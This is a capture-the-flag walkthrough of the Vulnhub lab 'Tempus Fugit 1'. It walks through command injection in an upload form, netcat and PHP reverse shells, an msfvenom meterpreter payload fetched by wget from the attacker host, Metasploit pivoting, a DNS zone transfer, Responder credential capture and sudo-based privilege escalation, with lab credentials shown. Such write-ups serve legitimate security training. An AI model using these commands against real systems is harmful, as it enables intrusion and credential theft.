# Tempus Fugit 1 Walkthrough :computer:

Creators: [@4nqr34z](https://twitter.com/4nqr34z) and [@DCAU](https://twitter.com/DCAU7). 

Vulnhub description:

> "Tempus Fugit is a Latin phrase that roughly translated as “time flies”. It is an intermediate real life box.
> Created mostly by 4ndr34z with some assistance by DCAU, the idea behind Tempus Fugit 
> was to create something “out of the ordinary” and without giving anything away, 
> something “dynamic” and a lot like time... changing. 
> The vm contains both user and root flags. If you don’t see them, you are not 
> looking in the right place...Need any hints? Feel free to contact us on Twitter: @4nqr34z @DCAU7 
> DHCP-Client. Tested both on Virtualbox and vmware
> Health warning: May drive people insane"

Download from [vulnhub](https://www.vulnhub.com/entry/tempus-fugit-1,346/):

## Pentesting Process

- [**Network Scanning**](#network-scanning)
  - [Netdiscover](#netdiscover):
  - [Nmap Scan](#nmap-scan)
- [**Enumeration**](#enumeration)
  - [Browsing Webpage](#browsing-webpage)
  - [Command Injection Test with Burp](#command-injection-test-with-burp)
  - [Bypassing Dot Notation](#bypassing-dot-notation)
  - [Command Injection Reverse Shell](#command-injection-reverse-shell)
  - [Break Out of Shell](#break-out-of-shell)
  - [False Root](#false-root)
  - [Further Enumeration](#further-enumeration)
  - [Docker Containers](#docker-containers)
  - [FTP CMS Credentials](#ftp-cms-credentials)
  - [Performing Nmap Scan on Target](#performing-nmap-scan-on-target)
  
- [**Exploitation**](#exploitation)
  - [Pivot with PortFwd and MSFVenom](#pivot-with-portfwd-and-msfvenom)
  - [Port Forwarding](#port-forwarding)
- [**Post Exploitation**](#post-exploitation)
  - [Dig Zone Transfer](#dig-zone-transfer)
  - [PHP Reverse Shell](#php-reverse-shell)
- [**Privilege Escalation and Root Flag**](#privilege-escalation-and-root-flag)
  - [Enumerating Privileges](#enumerating-privileges)
  - [Escalating Using GTFOBins](#escalating-using-gtfobins)
- [**Root Flag**](#root-flag)

# Network Scanning
## Netdiscover
![](https://github.com/azul-007/boxes/blob/master/tempus/images/netdiscover.png)

Kicking things off with a netdiscover scan. Ensure that you're operating in a NAT environment. Never put vulnerable machines
on your real network. Victim IP has been found, **192.168.19.149**
## Nmap Scan
![](https://github.com/azul-007/boxes/blob/master/tempus/images/nmap.png)

I scanned the target with my [custom python script](https://github.com/azul-007/tools/blob/master/reconnaissance/boxscan.py). This script creates a box with the name of the target and executes nmap, dirb and nikto scans. It will then move into the target directory and create an image directory. The output of the scans are sent to text files with the target name appended to each scan type.

Here we see that only port 80 is open, running an nginx server 1.15.3 and OS is Linux version 3.x or 4.x. Time to do some hunting, on to enumeration!

# Enumeration
## Browsing Webpage
![](https://github.com/azul-007/boxes/blob/master/tempus/images/upload_button.png)

Navigate to the page at http://192.168.19.149

## Command Injection Test with Burp

![](https://github.com/azul-007/boxes/blob/master/tempus/images/upload_page.png)

Browsing the page you'll notice an upload tab. This immediately catches my attention. Any time you come across a web page with upload capabilities, you should investigate and test to see what you can/can't upload. Intercept the request with Burp proxy and try modifying the extension. Here I tested for command injection with "id". If successful, it should display the contents of the text as well as the ouput of the "id" command.

> With Burp Suite open upload your file...

![](https://github.com/azul-007/boxes/blob/master/tempus/images/command_injection_test.png)

> Inject "id" after test3.txt;

![](https://github.com/azul-007/boxes/blob/master/tempus/images/command_injection_test2.png.png)

> Success! Command injection is possible

Ok, let's see what we can find in the current directory. Intercept the request again. But for this command injection attempt we're going to use **ls -l**

![](https://github.com/azul-007/boxes/blob/master/tempus/images/command_injection.png)

Look closely, you'll see a python file titled main.py. Intercept the request again and attempt to list the contents of main.py. Dot notation is being implemented, preventing you from seeing the contents. Perform another intercept, this time using a wildcard on main.py

![](https://github.com/azul-007/boxes/blob/master/tempus/images/cat_main_2.png)

![](https://github.com/azul-007/boxes/blob/master/tempus/images/cat_main_Creds.png)

> Credentials: 'someuser', 'b232a4da4c104798be4613ab76d26efda1a04606'

## Bypassing Dot Notation

![](https://github.com/azul-007/boxes/blob/master/tempus/images/smartconversion.png)

I tried uploading a netcat reverse shell via command injection with the given IP, however, it would not work. After some trial and error, I got curious and converted the IP to a long number via [smartconversion](https://www.smartconversion.com/unit_conversion/IP_Address_Converter.aspx)

## Command Injection Reverse Shell

Because we've proven that command injection works. Let's attempt to upload a netcat reverse shell. Use [highoncoffee](https://highon.coffee/blog/reverse-shell-cheat-sheet/) for all your reverse shell needs!

![](https://github.com/azul-007/boxes/blob/master/tempus/images/netcat_reverse_shell2.png)

## Break out of Shell

After you've obtained the shell, it's a safe best to assume you're in a limited shell. Break out of the shell using
python; 

python -c "import pty;pty.spawn('/bin/bash')"

![](https://github.com/azul-007/boxes/blob/master/tempus/images/python_break_shell.png)

## False Root

Enumerating the root directory you'll find a text file. List the contents annnnnnd...they got us with the okey doke...bastards lol

![](https://github.com/azul-007/boxes/blob/master/tempus/images/root_message.png)

## Further Enumeration

![](https://github.com/azul-007/boxes/blob/master/tempus/images/root_directory_enumeration.png)


Enumerating further...We again list all the content within /root/.ncftp with ls -la to reveal any hidden directories. There are three files here:
  * firewall - NcFTP firewall preferences
  * init_v3 - file used by NcFTP to annotate first time usage
  * trace.234 - traffic trace of LibNcFTP.

![](https://github.com/azul-007/boxes/blob/master/tempus/images/failed_connect_172_19_0_12.png)

The file trace.234 shows a failure to connect to 172.19.0.12 ... but this IP isn't in our subnet of 192.168.19.0/24. I got a little frustrated and reached out to @DCAU. He gave me a hint that the box is in a docker container and that they're actually a few containers. Which would explain the failed connection to 172.19.0.12.

But what flavor of linux is running? Execute cat /etc/*release to uncover this mystery

![](https://github.com/azul-007/boxes/blob/master/tempus/images/alpine_linux.png)


## Docker Containers

So there are two ways I retroactively saw that I was in a docker container: 
  1) Using this [article](https://tuhrig.de/how-to-know-you-are-inside-a-docker-container/)
  2) Simply listing all hidden directories. This will reveal the .dockerenv file

Let's start with the second option. Notice the .dockerenv file has a size of 0 bytes.

![](https://github.com/azul-007/boxes/blob/master/tempus/images/dockerenv.png)

And now to elaborate on the first option...

Going back to ~/ we see our usual directories but there is a peculiar one.. **/proc** what could this be?
* /proc is a pseudo file system that "provides an interface to kernel data structures of processes".
* Every process will have an entry identified by it's PID.../proc/[pid]
* In /proc/1 is a file called cgroup. It contains information about the control group the process belongs to.
* Listing the contents of this file reveals things such as the cpu, memory and devices. But this also reveals the name of the container that each resource belongs to.

We should try logging into 172.19.0.12. Before we do that, let's install lftp for apline linux. The command is **apk add lftp**

![](https://github.com/azul-007/boxes/blob/master/tempus/images/lftp.png)

## FTP CMS Credentials

Using the credentials we found in 'Command Injection Test with Burp' log into 172.19.0.12: **lftp ftp://someuser@172.19.0.12**
And we are successful logging in. List the contents and you'll find a cmscreds.txt file that reveales the admin CMS password: **hardEnough4u**

![](https://github.com/azul-007/boxes/blob/master/tempus/images/cms_creds.png)

Download the file by typing get cmscreds.txt and exit by typing 'bye'.

## Performing Nmap Scan on Target

I was kinda lost at this point. Had to take a break and come back into my notes a little later. Reading the hints I got from @DCAU helped clear my thoughts. Because there are multiple containers, why not scan the entire subnet for the others?

First verify if nmap is installed. It is not, so install with apk add nmap. Now scan the 172.19.0.0 subnet.

![](https://github.com/azul-007/boxes/blob/master/tempus/images/nmap_docker_containers.png)

We have three machines:
  * 172.19.0.1
  * 172.19.0.12
  * 172.19.0.100

We can cross 172.19.0.12 off our list. 12 is hosting a web page and 100 more than likely has a DNS server logs (port 53). Let


# Exploitation

Getting a shell on 192.168.19.149 was great and all but we still need to get access to two of three uncovered machines. So how
are we going to get access to devices that are not in our subnet? Welcome to pivoting via exploitation and port forwarding!

## Pivot with PortFwd and MSFVenom

***Before we proceed ensure that you have closed Burp***

Start apache2
````
service apache2 start
````

We need to get a meterpreter session going to use Metasploit's Portfwd module in order to forward a TCP port. We'll do this by 
executing a payload created via [MSFVenom](https://www.offensive-security.com/metasploit-unleashed/msfvenom/).

````
msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=192.168.19.145 LPORT=8000 -f elf > tempus_shell.elf
````

````
* Start metasploit
  * msfconsole
  * use exploit/multi/handler
  * set payload linux/x86/meterpreter/reverse_tcp
  * set LPORT 8000
  * set LHOST host_IP
  * run
```` 

On the victim/target download the shell from attacker and give executable permissions
````
wget attacker_ip/tempus_shell.elf
````
![](https://github.com/azul-007/boxes/blob/master/tempus/images/metasploit_and_tempus_payload.png)

## Port Forwarding

Now we need to setup port forwarding rules 
[here is a step by step guide on the syntax](https://www.offensive-security.com/metasploit-unleashed/portfwd/)
````
portfwd add -l 8080 -p 8080 -r TARGET_IP
````

![](https://github.com/azul-007/boxes/blob/master/tempus/images/portfwd.png)

Now with this port forwarded we can access the machines on the 172.19.0.0/16 subnetwork.

# Post Exploitation

in the segment [Performing Nmap Scan on Target](#performing-nmap-scan-on-target) we unraveled and scanned the three machines:

   * 172.19.0.1
   * 172.19.0.12
   * 172.19.0.100

172.19.0.12 has port 8080 opened, naturally we attempt to access that webpage:

![](https://github.com/azul-007/boxes/blob/master/tempus/images/172.19.0.1_8080_fail.png)

> Surprise, surprise we can.t -___-

# Dig Zone Transfer
Moving on to 172.19.0.100, from the nmap scan we see that port 53 is open. This is DNS and there's probably an active DNS server present.
I should've performed a deeper scan for more analysis, but screw it we're close! Cat'ing the etc/resolv.conf file on 192.168.19.149, we see an entry listed 
as *search mofo.pwn*.

Use dig to perform a DNS lookup on mofo.pwn...Tried executing the command, turns out we need to install dig on the target. Remember, this is alpine linux so the commands are different:
````
apk add bind-tools
````

Use the axfr command to initiate a zone transfer on the target.

![](https://github.com/azul-007/boxes/blob/master/tempus/images/ourcms_mofo_pwn2.png)

From the output, you will see an entry giving the name of the cms; ourcms.mofo.pwn

Next edit your host file to show your host ip mapped to ourcms.mofo.pwn

![](https://github.com/azul-007/boxes/blob/master/tempus/images/host_mapping.png)

Now navigate to http://ourcms.mofo.pwn:8080/ and wait for it...SUCCESS!!!!

![](https://github.com/azul-007/boxes/blob/master/tempus/images/ourcms_page.png) 

Let's try http://ourcms.mofo.pwn:8080/admin/. Use the credentials found in [FTP CMS Credentials](#ftp-cms-credentials) with the username 'admin'.

![](https://github.com/azul-007/boxes/blob/master/tempus/images/ourcms_admin.png)

# PHP Reverse Shell

On the admin page, there's a tab for "Plugins". One is activated the other is not. Send Anonymous Data: This plugin will send data about your system. Took a screen shot of the previewed data, may be important down the road.
When going through the send anon data steps, it allows you to preview the data to be sent. Here there was some interesting info dispalyed, such as the the name of and version of the CMS: getsimple 3.3.15 cvedtails revealed that..."An issue was discovered in GetSimple CMS through 3.3.15. insufficient input sanitation in the theme-edit.php file allows upload of files with arbitrary content (PHP code, for example). This vulnerability is triggered by an authenticated user". 

We can upload a php reverse shell. Go to the Edit Theme option on the Theme tab.

Run netcat on your host with port 6000. Download the php reverse shell script from [pentestmonkey](http://pentestmonkey.net/tools/web-shells/php-reverse-shell) and change the $ip and $port variables to your host IP and port 6000. 

![](https://github.com/azul-007/boxes/blob/master/tempus/images/pentest_monkey_php_reverse_shell.png)

Annnnnnnd houston we have a shell!!!

Just for pre-caution; python -c "import pty;pty.spawn('/bin/bash')" to the rescue!
Digging around some more and I'm lost. I decided to phone a friend. Funny enough, CompTIA's Pentest+ also had the answer all along: Responder! I should really open that book more often.

# Responder Poisoner

Responder poisons responses by spoofing name resolving services. It will impersonate legit hosts listening on the network and respond to target service requests. And what have we proven about one of the machines in the 172.19.0.0/16 subnet? It has a DNS server! And DNS is a name resolution service!!!

Running [responder](https://cyberarms.wordpress.com/2018/01/12/easy-creds-with-responder-and-kali-linux/) revealed some creds!! anthia:spencer

Change user to anthia:
````
su anthia
````

![](https://github.com/azul-007/boxes/blob/master/tempus/images/responder_creds.png)

Enumerating as anthia, I found a mail directory under /var. Reading the contents of anthia shows an email that displays more creds! franky:9u4lw0r82bo7

![](https://github.com/azul-007/boxes/blob/master/tempus/images/franky_creds.png)

Change user to franky:
````
su franky
````

# Privilege Escalation and Root Flag

Issuing a sudo -l reveals franky can execute sudo on the nice command. Using [gtfobins](https://gtfobins.github.io/gtfobins/nice/#sudo) we are finally able to obtain root!!!!!! Execute the proof script
````
./proof.sh
````

![](https://github.com/azul-007/boxes/blob/master/tempus/images/root.png)
